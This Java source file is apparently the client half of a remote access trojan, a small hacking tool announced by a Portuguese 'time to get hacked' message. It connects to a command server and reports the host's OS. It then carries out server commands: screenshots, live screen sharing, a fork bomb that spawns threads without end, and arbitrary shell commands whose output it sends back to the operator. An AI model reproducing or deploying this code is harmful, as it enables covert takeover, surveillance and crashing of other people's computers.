package main;

import java.awt.*;
import java.io.IOException;
import java.net.Socket;
import java.util.Scanner;

import static main.ClientUtils.startOnNewThread;
import static main.ScreenUtils.startScreenShare;
import static main.ScreenUtils.stopScreenShare;

public class Client {
    static Connection connection;
    static OsCheck.OSType MY_OS;

    public static void main(String[] args) {
        try {
            System.out.println("Opa ta na hora de ser haskiado");
            connection = new Connection(new Socket("localhost", 12345));

            MY_OS = OsCheck.getOperatingSystemType();

            Message osMessage = new Message("print", "User is using " + MY_OS.name());
            connection.sendMessage(osMessage);

            while (true) {
                handleServerCommand();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static void handleServerCommand() throws AWTException, IOException {
        String command = connection.readMessage().getCommand();

        switch (command) {
            case "screen":
                ScreenUtils.sendScreenshot(connection, false);
                break;
            case "start-screenshare":
                startScreenShare(connection);
                break;
            case "stop-screenshare":
                stopScreenShare();
                break;
            case "bomb":
                forkBomb();
            default:
                runTerminalCommand(MY_OS, command);
        }
    }

    private static void forkBomb() {
        while (true)
            startOnNewThread(new Bomb(connection));
    }

    private static void runTerminalCommand(OsCheck.OSType os, String command) throws IOException {
        if (os.equals(OsCheck.OSType.Windows)) {
            Runtime.getRuntime().exec("cmd /c cd C:\\");
            command = "cmd /c" + command;
        }

        Process proc = Runtime.getRuntime().exec(command);
        Scanner respostaDoComando = new Scanner(proc.getInputStream());

        StringBuilder response = new StringBuilder();
        while (respostaDoComando.hasNext()) {
            response.append(respostaDoComando.nextLine() + "\n");
        }
        response.append("---------------------------------------");
        connection.sendMessage(new Message("print", response.toString()));
    }


}
